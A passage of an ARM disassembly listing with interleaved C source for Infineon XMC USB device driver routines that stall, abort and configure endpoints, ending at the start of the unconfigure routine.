 8005a6e:	72fb      	strb	r3, [r7, #11]
			xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl = data.d32;
 8005a70:	68fb      	ldr	r3, [r7, #12]
 8005a72:	781b      	ldrb	r3, [r3, #0]
 8005a74:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005a78:	b2db      	uxtb	r3, r3
 8005a7a:	4a19      	ldr	r2, [pc, #100]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 8005a7c:	336a      	adds	r3, #106	; 0x6a
 8005a7e:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8005a82:	68ba      	ldr	r2, [r7, #8]
 8005a84:	601a      	str	r2, [r3, #0]
 8005a86:	e01f      	b.n	8005ac8 <XMC_USBD_EndpointStall+0x130>
		}
		else
		{
			data.d32 = xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl;
 8005a88:	68fb      	ldr	r3, [r7, #12]
 8005a8a:	781b      	ldrb	r3, [r3, #0]
 8005a8c:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005a90:	b2db      	uxtb	r3, r3
 8005a92:	4a13      	ldr	r2, [pc, #76]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 8005a94:	3370      	adds	r3, #112	; 0x70
 8005a96:	009b      	lsls	r3, r3, #2
 8005a98:	4413      	add	r3, r2
 8005a9a:	685b      	ldr	r3, [r3, #4]
 8005a9c:	681b      	ldr	r3, [r3, #0]
 8005a9e:	60bb      	str	r3, [r7, #8]
			data.b.stall = 0U;
 8005aa0:	7abb      	ldrb	r3, [r7, #10]
 8005aa2:	f36f 1345 	bfc	r3, #5, #1
 8005aa6:	72bb      	strb	r3, [r7, #10]
			data.b.setd0pid = 1U; /* reset pid to 0 */
 8005aa8:	7afb      	ldrb	r3, [r7, #11]
 8005aaa:	f043 0310 	orr.w	r3, r3, #16
 8005aae:	72fb      	strb	r3, [r7, #11]
			xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl = data.d32;
 8005ab0:	68fb      	ldr	r3, [r7, #12]
 8005ab2:	781b      	ldrb	r3, [r3, #0]
 8005ab4:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005ab8:	b2db      	uxtb	r3, r3
 8005aba:	4a09      	ldr	r2, [pc, #36]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 8005abc:	3370      	adds	r3, #112	; 0x70
 8005abe:	009b      	lsls	r3, r3, #2
 8005ac0:	4413      	add	r3, r2
 8005ac2:	685b      	ldr	r3, [r3, #4]
 8005ac4:	68ba      	ldr	r2, [r7, #8]
 8005ac6:	601a      	str	r2, [r3, #0]
		}
		ep->isStalled = 0U;
 8005ac8:	68fa      	ldr	r2, [r7, #12]
 8005aca:	7913      	ldrb	r3, [r2, #4]
 8005acc:	f36f 1345 	bfc	r3, #5, #1
 8005ad0:	7113      	strb	r3, [r2, #4]
	}
	return XMC_USBD_STATUS_OK;
 8005ad2:	2300      	movs	r3, #0
}
 8005ad4:	4618      	mov	r0, r3
 8005ad6:	3714      	adds	r7, #20
 8005ad8:	46bd      	mov	sp, r7
 8005ada:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ade:	4770      	bx	lr
 8005ae0:	20000a84 	.word	0x20000a84

08005ae4 <XMC_USBD_EndpointAbort>:

/**
 * Aborts the data transfer on the selected endpoint
 **/
XMC_USBD_STATUS_t XMC_USBD_EndpointAbort(const uint8_t ep_addr) {
 8005ae4:	b480      	push	{r7}
 8005ae6:	b085      	sub	sp, #20
 8005ae8:	af00      	add	r7, sp, #0
 8005aea:	4603      	mov	r3, r0
 8005aec:	71fb      	strb	r3, [r7, #7]
  XMC_USBD_EP_t *ep = &xmc_device.ep[ep_addr & (uint8_t)XMC_USBD_ENDPOINT_NUMBER_MASK];
 8005aee:	79fb      	ldrb	r3, [r7, #7]
 8005af0:	f003 030f 	and.w	r3, r3, #15
 8005af4:	2234      	movs	r2, #52	; 0x34
 8005af6:	fb02 f303 	mul.w	r3, r2, r3
 8005afa:	4a1b      	ldr	r2, [pc, #108]	; (8005b68 <XMC_USBD_EndpointAbort+0x84>)
 8005afc:	4413      	add	r3, r2
 8005afe:	60fb      	str	r3, [r7, #12]
  if (ep->address_u.address_st.direction)
 8005b00:	68fb      	ldr	r3, [r7, #12]
 8005b02:	781b      	ldrb	r3, [r3, #0]
 8005b04:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8005b08:	b2db      	uxtb	r3, r3
 8005b0a:	2b00      	cmp	r3, #0
 8005b0c:	d004      	beq.n	8005b18 <XMC_USBD_EndpointAbort+0x34>
  {
    ep->inInUse = 0U;
 8005b0e:	68fa      	ldr	r2, [r7, #12]
 8005b10:	6853      	ldr	r3, [r2, #4]
 8005b12:	f36f 03c3 	bfc	r3, #3, #1
 8005b16:	6053      	str	r3, [r2, #4]
  }
  if (!ep->address_u.address_st.direction)
 8005b18:	68fb      	ldr	r3, [r7, #12]
 8005b1a:	781b      	ldrb	r3, [r3, #0]
 8005b1c:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8005b20:	b2db      	uxtb	r3, r3
 8005b22:	2b00      	cmp	r3, #0
 8005b24:	d104      	bne.n	8005b30 <XMC_USBD_EndpointAbort+0x4c>
  {
    ep->outInUse = 0U;
 8005b26:	68fa      	ldr	r2, [r7, #12]
 8005b28:	6853      	ldr	r3, [r2, #4]
 8005b2a:	f36f 1304 	bfc	r3, #4, #1
 8005b2e:	6053      	str	r3, [r2, #4]
  }
  ep->isStalled = 0U;
 8005b30:	68fa      	ldr	r2, [r7, #12]
 8005b32:	7913      	ldrb	r3, [r2, #4]
 8005b34:	f36f 1345 	bfc	r3, #5, #1
 8005b38:	7113      	strb	r3, [r2, #4]
  ep->outBytesAvailable = 0U;
 8005b3a:	68fb      	ldr	r3, [r7, #12]
 8005b3c:	2200      	movs	r2, #0
 8005b3e:	611a      	str	r2, [r3, #16]
  ep->outOffset = 0U;
 8005b40:	68fb      	ldr	r3, [r7, #12]
 8005b42:	2200      	movs	r2, #0
 8005b44:	619a      	str	r2, [r3, #24]
  ep->xferLength = 0U;
 8005b46:	68fb      	ldr	r3, [r7, #12]
 8005b48:	2200      	movs	r2, #0
 8005b4a:	629a      	str	r2, [r3, #40]	; 0x28
  ep->xferCount = 0U;
 8005b4c:	68fb      	ldr	r3, [r7, #12]
 8005b4e:	2200      	movs	r2, #0
 8005b50:	62da      	str	r2, [r3, #44]	; 0x2c
  ep->xferTotal = 0U;
 8005b52:	68fb      	ldr	r3, [r7, #12]
 8005b54:	2200      	movs	r2, #0
 8005b56:	631a      	str	r2, [r3, #48]	; 0x30

  return XMC_USBD_STATUS_OK;
 8005b58:	2300      	movs	r3, #0
}
 8005b5a:	4618      	mov	r0, r3
 8005b5c:	3714      	adds	r7, #20
 8005b5e:	46bd      	mov	sp, r7
 8005b60:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005b64:	4770      	bx	lr
 8005b66:	bf00      	nop
 8005b68:	20000a84 	.word	0x20000a84

08005b6c <XMC_USBD_EndpointConfigure>:
 * Configures the given endpoint
 **/
XMC_USBD_STATUS_t XMC_USBD_EndpointConfigure(const uint8_t ep_addr,
		                                     const XMC_USBD_ENDPOINT_TYPE_t ep_type,
		                                     const uint16_t ep_max_packet_size) 
{
 8005b6c:	b580      	push	{r7, lr}
 8005b6e:	b086      	sub	sp, #24
 8005b70:	af00      	add	r7, sp, #0
 8005b72:	4603      	mov	r3, r0
 8005b74:	71fb      	strb	r3, [r7, #7]
 8005b76:	460b      	mov	r3, r1
 8005b78:	71bb      	strb	r3, [r7, #6]
 8005b7a:	4613      	mov	r3, r2
 8005b7c:	80bb      	strh	r3, [r7, #4]
  daint_data_t daintmsk;
  XMC_USBD_EP_t *ep;
  daintmsk.d32 = xmc_device.device_register->daintmsk;  
 8005b7e:	4b9d      	ldr	r3, [pc, #628]	; (8005df4 <XMC_USBD_EndpointConfigure+0x288>)
 8005b80:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005b84:	69db      	ldr	r3, [r3, #28]
 8005b86:	613b      	str	r3, [r7, #16]
  ep =&xmc_device.ep[ep_addr & (uint32_t)XMC_USBD_ENDPOINT_NUMBER_MASK];
 8005b88:	79fb      	ldrb	r3, [r7, #7]
 8005b8a:	f003 030f 	and.w	r3, r3, #15
 8005b8e:	2234      	movs	r2, #52	; 0x34
 8005b90:	fb02 f303 	mul.w	r3, r2, r3
 8005b94:	4a97      	ldr	r2, [pc, #604]	; (8005df4 <XMC_USBD_EndpointConfigure+0x288>)
 8005b96:	4413      	add	r3, r2
 8005b98:	617b      	str	r3, [r7, #20]
  memset((void*)ep,0x0U,sizeof(XMC_USBD_EP_t)); /* clear endpoint structure */
 8005b9a:	2234      	movs	r2, #52	; 0x34
 8005b9c:	2100      	movs	r1, #0
 8005b9e:	6978      	ldr	r0, [r7, #20]
 8005ba0:	f000 fe60 	bl	8006864 <memset>
  /* do ep configuration */
  ep->address_u.address = ep_addr;
 8005ba4:	697b      	ldr	r3, [r7, #20]
 8005ba6:	79fa      	ldrb	r2, [r7, #7]
 8005ba8:	701a      	strb	r2, [r3, #0]
  ep->isConfigured = 1U;
 8005baa:	697a      	ldr	r2, [r7, #20]
 8005bac:	7913      	ldrb	r3, [r2, #4]
 8005bae:	f043 0304 	orr.w	r3, r3, #4
 8005bb2:	7113      	strb	r3, [r2, #4]
  ep->maxPacketSize = (uint8_t)ep_max_packet_size;
 8005bb4:	88bb      	ldrh	r3, [r7, #4]
 8005bb6:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8005bba:	b2d9      	uxtb	r1, r3
 8005bbc:	697a      	ldr	r2, [r7, #20]
 8005bbe:	6853      	ldr	r3, [r2, #4]
 8005bc0:	f361 23d1 	bfi	r3, r1, #11, #7
 8005bc4:	6053      	str	r3, [r2, #4]
  if (ep->address_u.address != 0U)
 8005bc6:	697b      	ldr	r3, [r7, #20]
 8005bc8:	781b      	ldrb	r3, [r3, #0]
 8005bca:	2b00      	cmp	r3, #0
 8005bcc:	d007      	beq.n	8005bde <XMC_USBD_EndpointConfigure+0x72>
  {
    ep->maxTransferSize = (uint32_t)XMC_USBD_MAX_TRANSFER_SIZE;
 8005bce:	697a      	ldr	r2, [r7, #20]
 8005bd0:	6893      	ldr	r3, [r2, #8]
 8005bd2:	f64f 71c0 	movw	r1, #65472	; 0xffc0
 8005bd6:	f361 0312 	bfi	r3, r1, #0, #19
 8005bda:	6093      	str	r3, [r2, #8]
 8005bdc:	e005      	b.n	8005bea <XMC_USBD_EndpointConfigure+0x7e>
  }
  else
  {
    ep->maxTransferSize = (uint32_t)XMC_USBD_MAX_TRANSFER_SIZE_EP0;
 8005bde:	697a      	ldr	r2, [r7, #20]
 8005be0:	6893      	ldr	r3, [r2, #8]
 8005be2:	2140      	movs	r1, #64	; 0x40
 8005be4:	f361 0312 	bfi	r3, r1, #0, #19
 8005be8:	6093      	str	r3, [r2, #8]
  }
  /* transfer buffer */
  ep->inBuffer = XMC_USBD_EP_IN_BUFFER[ep->address_u.address_st.number];
 8005bea:	697b      	ldr	r3, [r7, #20]
 8005bec:	781b      	ldrb	r3, [r3, #0]
 8005bee:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005bf2:	b2db      	uxtb	r3, r3
 8005bf4:	021b      	lsls	r3, r3, #8
 8005bf6:	4a80      	ldr	r2, [pc, #512]	; (8005df8 <XMC_USBD_EndpointConfigure+0x28c>)
 8005bf8:	441a      	add	r2, r3
 8005bfa:	697b      	ldr	r3, [r7, #20]
 8005bfc:	61da      	str	r2, [r3, #28]
  ep->outBuffer = XMC_USBD_EP_OUT_BUFFER[ep->address_u.address_st.number];
 8005bfe:	697b      	ldr	r3, [r7, #20]
 8005c00:	781b      	ldrb	r3, [r3, #0]
 8005c02:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005c06:	b2db      	uxtb	r3, r3
 8005c08:	021b      	lsls	r3, r3, #8
 8005c0a:	4a7c      	ldr	r2, [pc, #496]	; (8005dfc <XMC_USBD_EndpointConfigure+0x290>)
 8005c0c:	441a      	add	r2, r3
 8005c0e:	697b      	ldr	r3, [r7, #20]
 8005c10:	60da      	str	r2, [r3, #12]
  /* buffer size*/
  ep->inBufferSize = XMC_USBD_EP_IN_BUFFERSIZE[ep->address_u.address_st.number];
 8005c12:	697b      	ldr	r3, [r7, #20]
 8005c14:	781b      	ldrb	r3, [r3, #0]
 8005c16:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005c1a:	b2db      	uxtb	r3, r3
 8005c1c:	461a      	mov	r2, r3
 8005c1e:	4b78      	ldr	r3, [pc, #480]	; (8005e00 <XMC_USBD_EndpointConfigure+0x294>)
 8005c20:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8005c24:	697b      	ldr	r3, [r7, #20]
 8005c26:	621a      	str	r2, [r3, #32]
  ep->outBufferSize = XMC_USBD_EP_OUT_BUFFERSIZE[ep->address_u.address_st.number];
 8005c28:	697b      	ldr	r3, [r7, #20]
 8005c2a:	781b      	ldrb	r3, [r3, #0]
 8005c2c:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005c30:	b2db      	uxtb	r3, r3
 8005c32:	461a      	mov	r2, r3
 8005c34:	4b73      	ldr	r3, [pc, #460]	; (8005e04 <XMC_USBD_EndpointConfigure+0x298>)
 8005c36:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8005c3a:	697b      	ldr	r3, [r7, #20]
 8005c3c:	615a      	str	r2, [r3, #20]
  /* is in */
  if ((ep->address_u.address_st.direction == 1U) || (ep_type == XMC_USBD_ENDPOINT_TYPE_CONTROL))
 8005c3e:	697b      	ldr	r3, [r7, #20]
 8005c40:	781b      	ldrb	r3, [r3, #0]
 8005c42:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8005c46:	b2db      	uxtb	r3, r3
 8005c48:	2b00      	cmp	r3, #0
 8005c4a:	d102      	bne.n	8005c52 <XMC_USBD_EndpointConfigure+0xe6>
 8005c4c:	79bb      	ldrb	r3, [r7, #6]
 8005c4e:	2b00      	cmp	r3, #0
 8005c50:	d17c      	bne.n	8005d4c <XMC_USBD_EndpointConfigure+0x1e0>
  {
    depctl_data_t data;
    data.d32 = xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl;
 8005c52:	697b      	ldr	r3, [r7, #20]
 8005c54:	781b      	ldrb	r3, [r3, #0]
 8005c56:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005c5a:	b2db      	uxtb	r3, r3
 8005c5c:	4a65      	ldr	r2, [pc, #404]	; (8005df4 <XMC_USBD_EndpointConfigure+0x288>)
 8005c5e:	336a      	adds	r3, #106	; 0x6a
 8005c60:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8005c64:	681b      	ldr	r3, [r3, #0]
 8005c66:	60fb      	str	r3, [r7, #12]
		/*enable endpoint */
		data.b.usbactep = 1U;
 8005c68:	7b7b      	ldrb	r3, [r7, #13]
 8005c6a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005c6e:	737b      	strb	r3, [r7, #13]
		/* set ep type */
		data.b.eptype = (uint8_t)ep_type;
 8005c70:	79bb      	ldrb	r3, [r7, #6]
 8005c72:	f003 0303 	and.w	r3, r3, #3
 8005c76:	b2da      	uxtb	r2, r3
 8005c78:	7bbb      	ldrb	r3, [r7, #14]
 8005c7a:	f362 0383 	bfi	r3, r2, #2, #2
 8005c7e:	73bb      	strb	r3, [r7, #14]
		/* set mps */
    if (ep_type == XMC_USBD_ENDPOINT_TYPE_CONTROL)
 8005c80:	79bb      	ldrb	r3, [r7, #6]
 8005c82:	2b00      	cmp	r3, #0
 8005c84:	d124      	bne.n	8005cd0 <XMC_USBD_EndpointConfigure+0x164>
    {
			switch(ep_max_packet_size)
 8005c86:	88bb      	ldrh	r3, [r7, #4]
 8005c88:	2b40      	cmp	r3, #64	; 0x40
 8005c8a:	d00a      	beq.n	8005ca2 <XMC_USBD_EndpointConfigure+0x136>
 8005c8c:	2b40      	cmp	r3, #64	; 0x40
 8005c8e:	dc28      	bgt.n	8005ce2 <XMC_USBD_EndpointConfigure+0x176>
 8005c90:	2b20      	cmp	r3, #32
 8005c92:	d00b      	beq.n	8005cac <XMC_USBD_EndpointConfigure+0x140>
 8005c94:	2b20      	cmp	r3, #32
 8005c96:	dc24      	bgt.n	8005ce2 <XMC_USBD_EndpointConfigure+0x176>
 8005c98:	2b08      	cmp	r3, #8
 8005c9a:	d013      	beq.n	8005cc4 <XMC_USBD_EndpointConfigure+0x158>
 8005c9c:	2b10      	cmp	r3, #16
 8005c9e:	d00b      	beq.n	8005cb8 <XMC_USBD_EndpointConfigure+0x14c>
				break;
				case (8U):
				data.b.mps = 0x3U;
				break;
				default:
				break;
 8005ca0:	e01f      	b.n	8005ce2 <XMC_USBD_EndpointConfigure+0x176>
				data.b.mps = 0x0U;
 8005ca2:	89bb      	ldrh	r3, [r7, #12]
 8005ca4:	f36f 030a 	bfc	r3, #0, #11
 8005ca8:	81bb      	strh	r3, [r7, #12]
				break;
 8005caa:	e01b      	b.n	8005ce4 <XMC_USBD_EndpointConfigure+0x178>
				data.b.mps = 0x1U;
 8005cac:	89bb      	ldrh	r3, [r7, #12]
 8005cae:	2201      	movs	r2, #1
 8005cb0:	f362 030a 	bfi	r3, r2, #0, #11
 8005cb4:	81bb      	strh	r3, [r7, #12]
				break;
 8005cb6:	e015      	b.n	8005ce4 <XMC_USBD_EndpointConfigure+0x178>
				data.b.mps = 0x2U;
 8005cb8:	89bb      	ldrh	r3, [r7, #12]
 8005cba:	2202      	movs	r2, #2
 8005cbc:	f362 030a 	bfi	r3, r2, #0, #11
 8005cc0:	81bb      	strh	r3, [r7, #12]
				break;
 8005cc2:	e00f      	b.n	8005ce4 <XMC_USBD_EndpointConfigure+0x178>
				data.b.mps = 0x3U;
 8005cc4:	89bb      	ldrh	r3, [r7, #12]
 8005cc6:	2203      	movs	r2, #3
 8005cc8:	f362 030a 	bfi	r3, r2, #0, #11
 8005ccc:	81bb      	strh	r3, [r7, #12]
				break;
 8005cce:	e009      	b.n	8005ce4 <XMC_USBD_EndpointConfigure+0x178>
			}
		}
		else
		{
			data.b.mps = ep_max_packet_size;
 8005cd0:	88bb      	ldrh	r3, [r7, #4]
 8005cd2:	f3c3 030a 	ubfx	r3, r3, #0, #11
 8005cd6:	b29a      	uxth	r2, r3
 8005cd8:	89bb      	ldrh	r3, [r7, #12]
 8005cda:	f362 030a 	bfi	r3, r2, #0, #11
 8005cde:	81bb      	strh	r3, [r7, #12]
 8005ce0:	e000      	b.n	8005ce4 <XMC_USBD_EndpointConfigure+0x178>
				break;
 8005ce2:	bf00      	nop
		}
		/* set first data0 pid */
		data.b.setd0pid = 1U;
 8005ce4:	7bfb      	ldrb	r3, [r7, #15]
 8005ce6:	f043 0310 	orr.w	r3, r3, #16
 8005cea:	73fb      	strb	r3, [r7, #15]
		/* clear stall */
		data.b.stall = 0U;
 8005cec:	7bbb      	ldrb	r3, [r7, #14]
 8005cee:	f36f 1345 	bfc	r3, #5, #1
 8005cf2:	73bb      	strb	r3, [r7, #14]
		/* set tx fifo */
		ep->txFifoNum = XMC_USBD_lAssignTXFifo(); /* get tx fifo */
 8005cf4:	f7fe fd08 	bl	8004708 <XMC_USBD_lAssignTXFifo>
 8005cf8:	4603      	mov	r3, r0
 8005cfa:	f003 030f 	and.w	r3, r3, #15
 8005cfe:	b2d9      	uxtb	r1, r3
 8005d00:	697a      	ldr	r2, [r7, #20]
 8005d02:	8893      	ldrh	r3, [r2, #4]
 8005d04:	f361 1389 	bfi	r3, r1, #6, #4
 8005d08:	8093      	strh	r3, [r2, #4]
		data.b.txfnum = ep->txFifoNum;
 8005d0a:	697b      	ldr	r3, [r7, #20]
 8005d0c:	889b      	ldrh	r3, [r3, #4]
 8005d0e:	f3c3 1383 	ubfx	r3, r3, #6, #4
 8005d12:	b2da      	uxtb	r2, r3
 8005d14:	89fb      	ldrh	r3, [r7, #14]
 8005d16:	f362 1389 	bfi	r3, r2, #6, #4
 8005d1a:	81fb      	strh	r3, [r7, #14]
		xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl = data.d32; /* configure endpoint */
 8005d1c:	697b      	ldr	r3, [r7, #20]
 8005d1e:	781b      	ldrb	r3, [r3, #0]
 8005d20:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005d24:	b2db      	uxtb	r3, r3
 8005d26:	4a33      	ldr	r2, [pc, #204]	; (8005df4 <XMC_USBD_EndpointConfigure+0x288>)
 8005d28:	336a      	adds	r3, #106	; 0x6a
 8005d2a:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8005d2e:	68fa      	ldr	r2, [r7, #12]
 8005d30:	601a      	str	r2, [r3, #0]
		daintmsk.ep.in |= (uint16_t)((uint16_t)1U << (uint8_t)ep->address_u.address_st.number); /* enable interrupts for endpoint */
 8005d32:	8a3a      	ldrh	r2, [r7, #16]
 8005d34:	697b      	ldr	r3, [r7, #20]
 8005d36:	781b      	ldrb	r3, [r3, #0]
 8005d38:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005d3c:	b2db      	uxtb	r3, r3
 8005d3e:	4619      	mov	r1, r3
 8005d40:	2301      	movs	r3, #1
 8005d42:	408b      	lsls	r3, r1
 8005d44:	b29b      	uxth	r3, r3
 8005d46:	4313      	orrs	r3, r2
 8005d48:	b29b      	uxth	r3, r3
 8005d4a:	823b      	strh	r3, [r7, #16]
  }
  if ((ep->address_u.address_st.direction == 0U) || (ep_type == XMC_USBD_ENDPOINT_TYPE_CONTROL))
 8005d4c:	697b      	ldr	r3, [r7, #20]
 8005d4e:	781b      	ldrb	r3, [r3, #0]
 8005d50:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8005d54:	b2db      	uxtb	r3, r3
 8005d56:	2b00      	cmp	r3, #0
 8005d58:	d002      	beq.n	8005d60 <XMC_USBD_EndpointConfigure+0x1f4>
 8005d5a:	79bb      	ldrb	r3, [r7, #6]
 8005d5c:	2b00      	cmp	r3, #0
 8005d5e:	d175      	bne.n	8005e4c <XMC_USBD_EndpointConfigure+0x2e0>
  {
    /* is out */
		depctl_data_t data;
		data.d32 = xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl;
 8005d60:	697b      	ldr	r3, [r7, #20]
 8005d62:	781b      	ldrb	r3, [r3, #0]
 8005d64:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005d68:	b2db      	uxtb	r3, r3
 8005d6a:	4a22      	ldr	r2, [pc, #136]	; (8005df4 <XMC_USBD_EndpointConfigure+0x288>)
 8005d6c:	3370      	adds	r3, #112	; 0x70
 8005d6e:	009b      	lsls	r3, r3, #2
 8005d70:	4413      	add	r3, r2
 8005d72:	685b      	ldr	r3, [r3, #4]
 8005d74:	681b      	ldr	r3, [r3, #0]
 8005d76:	60bb      	str	r3, [r7, #8]
		/*enable endpoint */
		data.b.usbactep = 1U;
 8005d78:	7a7b      	ldrb	r3, [r7, #9]
 8005d7a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005d7e:	727b      	strb	r3, [r7, #9]
		/* set ep type */
		data.b.eptype = (uint8_t)ep_type;
 8005d80:	79bb      	ldrb	r3, [r7, #6]
 8005d82:	f003 0303 	and.w	r3, r3, #3
 8005d86:	b2da      	uxtb	r2, r3
 8005d88:	7abb      	ldrb	r3, [r7, #10]
 8005d8a:	f362 0383 	bfi	r3, r2, #2, #2
 8005d8e:	72bb      	strb	r3, [r7, #10]
    /* set mps */
    if (ep_type == XMC_USBD_ENDPOINT_TYPE_CONTROL)
 8005d90:	79bb      	ldrb	r3, [r7, #6]
 8005d92:	2b00      	cmp	r3, #0
 8005d94:	d124      	bne.n	8005de0 <XMC_USBD_EndpointConfigure+0x274>
		{
			switch(ep_max_packet_size)
 8005d96:	88bb      	ldrh	r3, [r7, #4]
 8005d98:	2b40      	cmp	r3, #64	; 0x40
 8005d9a:	d00a      	beq.n	8005db2 <XMC_USBD_EndpointConfigure+0x246>
 8005d9c:	2b40      	cmp	r3, #64	; 0x40
 8005d9e:	dc33      	bgt.n	8005e08 <XMC_USBD_EndpointConfigure+0x29c>
 8005da0:	2b20      	cmp	r3, #32
 8005da2:	d00b      	beq.n	8005dbc <XMC_USBD_EndpointConfigure+0x250>
 8005da4:	2b20      	cmp	r3, #32
 8005da6:	dc2f      	bgt.n	8005e08 <XMC_USBD_EndpointConfigure+0x29c>
 8005da8:	2b08      	cmp	r3, #8
 8005daa:	d013      	beq.n	8005dd4 <XMC_USBD_EndpointConfigure+0x268>
 8005dac:	2b10      	cmp	r3, #16
 8005dae:	d00b      	beq.n	8005dc8 <XMC_USBD_EndpointConfigure+0x25c>
					break;
				case (8U):
					data.b.mps = 0x3U;
					break;
				default:
					break;
 8005db0:	e02a      	b.n	8005e08 <XMC_USBD_EndpointConfigure+0x29c>
					data.b.mps = 0x0U;
 8005db2:	893b      	ldrh	r3, [r7, #8]
 8005db4:	f36f 030a 	bfc	r3, #0, #11
 8005db8:	813b      	strh	r3, [r7, #8]
					break;
 8005dba:	e026      	b.n	8005e0a <XMC_USBD_EndpointConfigure+0x29e>
					data.b.mps = 0x1U;
 8005dbc:	893b      	ldrh	r3, [r7, #8]
 8005dbe:	2201      	movs	r2, #1
 8005dc0:	f362 030a 	bfi	r3, r2, #0, #11
 8005dc4:	813b      	strh	r3, [r7, #8]
					break;
 8005dc6:	e020      	b.n	8005e0a <XMC_USBD_EndpointConfigure+0x29e>
					data.b.mps = 0x2U;
 8005dc8:	893b      	ldrh	r3, [r7, #8]
 8005dca:	2202      	movs	r2, #2
 8005dcc:	f362 030a 	bfi	r3, r2, #0, #11
 8005dd0:	813b      	strh	r3, [r7, #8]
					break;
 8005dd2:	e01a      	b.n	8005e0a <XMC_USBD_EndpointConfigure+0x29e>
					data.b.mps = 0x3U;
 8005dd4:	893b      	ldrh	r3, [r7, #8]
 8005dd6:	2203      	movs	r2, #3
 8005dd8:	f362 030a 	bfi	r3, r2, #0, #11
 8005ddc:	813b      	strh	r3, [r7, #8]
					break;
 8005dde:	e014      	b.n	8005e0a <XMC_USBD_EndpointConfigure+0x29e>
			}
		}
		else
		{
			data.b.mps = ep_max_packet_size;
 8005de0:	88bb      	ldrh	r3, [r7, #4]
 8005de2:	f3c3 030a 	ubfx	r3, r3, #0, #11
 8005de6:	b29a      	uxth	r2, r3
 8005de8:	893b      	ldrh	r3, [r7, #8]
 8005dea:	f362 030a 	bfi	r3, r2, #0, #11
 8005dee:	813b      	strh	r3, [r7, #8]
 8005df0:	e00b      	b.n	8005e0a <XMC_USBD_EndpointConfigure+0x29e>
 8005df2:	bf00      	nop
 8005df4:	20000a84 	.word	0x20000a84
 8005df8:	30000700 	.word	0x30000700
 8005dfc:	30000000 	.word	0x30000000
 8005e00:	20000a68 	.word	0x20000a68
 8005e04:	20000a4c 	.word	0x20000a4c
					break;
 8005e08:	bf00      	nop
		}
		/* set first data0 pid */
		data.b.setd0pid = 1U;
 8005e0a:	7afb      	ldrb	r3, [r7, #11]
 8005e0c:	f043 0310 	orr.w	r3, r3, #16
 8005e10:	72fb      	strb	r3, [r7, #11]
		/* clear stall */
		data.b.stall =(uint8_t) 0U;
 8005e12:	7abb      	ldrb	r3, [r7, #10]
 8005e14:	f36f 1345 	bfc	r3, #5, #1
 8005e18:	72bb      	strb	r3, [r7, #10]
		xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl = data.d32; /* configure endpoint */
 8005e1a:	697b      	ldr	r3, [r7, #20]
 8005e1c:	781b      	ldrb	r3, [r3, #0]
 8005e1e:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005e22:	b2db      	uxtb	r3, r3
 8005e24:	4a0e      	ldr	r2, [pc, #56]	; (8005e60 <XMC_USBD_EndpointConfigure+0x2f4>)
 8005e26:	3370      	adds	r3, #112	; 0x70
 8005e28:	009b      	lsls	r3, r3, #2
 8005e2a:	4413      	add	r3, r2
 8005e2c:	685b      	ldr	r3, [r3, #4]
 8005e2e:	68ba      	ldr	r2, [r7, #8]
 8005e30:	601a      	str	r2, [r3, #0]
		daintmsk.ep.out |=(uint16_t) ((uint16_t)1U << (uint8_t)ep->address_u.address_st.number); /* enable interrupts */
 8005e32:	8a7a      	ldrh	r2, [r7, #18]
 8005e34:	697b      	ldr	r3, [r7, #20]
 8005e36:	781b      	ldrb	r3, [r3, #0]
 8005e38:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005e3c:	b2db      	uxtb	r3, r3
 8005e3e:	4619      	mov	r1, r3
 8005e40:	2301      	movs	r3, #1
 8005e42:	408b      	lsls	r3, r1
 8005e44:	b29b      	uxth	r3, r3
 8005e46:	4313      	orrs	r3, r2
 8005e48:	b29b      	uxth	r3, r3
 8005e4a:	827b      	strh	r3, [r7, #18]
  }
  xmc_device.device_register->daintmsk = daintmsk.d32;
 8005e4c:	4b04      	ldr	r3, [pc, #16]	; (8005e60 <XMC_USBD_EndpointConfigure+0x2f4>)
 8005e4e:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005e52:	693a      	ldr	r2, [r7, #16]
 8005e54:	61da      	str	r2, [r3, #28]
  return XMC_USBD_STATUS_OK;
 8005e56:	2300      	movs	r3, #0
}
 8005e58:	4618      	mov	r0, r3
 8005e5a:	3718      	adds	r7, #24
 8005e5c:	46bd      	mov	sp, r7
 8005e5e:	bd80      	pop	{r7, pc}
 8005e60:	20000a84 	.word	0x20000a84

08005e64 <XMC_USBD_EndpointUnconfigure>:

/**
 * Unconfigure the selected endpoint.
 **/
